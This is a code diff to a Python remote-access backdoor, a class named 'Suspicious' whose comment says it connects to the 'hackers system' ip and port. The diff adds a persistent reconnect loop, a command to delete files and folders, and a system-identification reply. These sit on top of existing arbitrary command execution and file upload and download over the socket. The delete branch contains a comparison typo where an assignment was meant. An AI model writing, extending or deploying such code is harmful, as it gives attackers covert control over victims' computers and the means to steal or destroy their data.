@@ -50,6 +50,22 @@ class Suspicious:
     def send_data(self, data):
         json_data = json.dumps(data)
         self.connetion.send(json_data.encode('utf-8'))
+    
+    def getSystemInfo(self):
+        platform = {'aix': 'AIX', 'linux':"Linux", 'win32': 'Windows', 'cygwin': 'Windows/Cygwin', 'darwin': 'macOs'}
+        return f"[+] Connected to \"{platform[sys.platform]}\" operating system"
+
+    def delete_items(self, path):
+        try:
+            import shutil
+            if os.path.isfile(path):
+                os.remove(path)
+                return "[=] File delete successful"
+            elif os.path.isdir(path):
+                shutil.rmtree(path)
+                return "[=] Folder delete successful"
+        except Exception as error:
+            return str(error)
 
     def start(self):
         while True:
@@ -58,12 +74,16 @@ class Suspicious:
                 if data_received[0].lower() == 'exit':
                     self.connetion.close()
                     sys.exit()
+                elif data_received[0] == 'what':
+                    command_result = self.getSystemInfo()
                 elif data_received[0].lower() == 'cd' and len(data_received) >1:
                     command_result = self.changeWorkingDirectory(data_received[1])
                 elif data_received[0].lower() == 'download':
                     command_result = self.read_file(data_received[1]).decode()
                 elif data_received[0].lower() == 'upload':
-                    command_result = self.download_file(data_received[1], data_received[2])
+                    command_result = self.download_file(data_received[-2], data_received[-1])
+                elif data_received[0] == 'delete':
+                    command_result == self.delete_items(data_received[1])
                 else:
                     command_result = self.execute_system_commands(data_received)
                 self.send_data(command_result)
@@ -74,5 +94,9 @@ class Suspicious:
                 # self.send_data("---- [=] Connection is still intact though [=] ----")
 
 # these ip and port values are of hackers system values
-backdoor = Suspicious(ip, port)
-backdoor.start()
+while True:
+    try:
+        backdoor = Suspicious(ip, port)
+        backdoor.start()
+    except:
+        continue
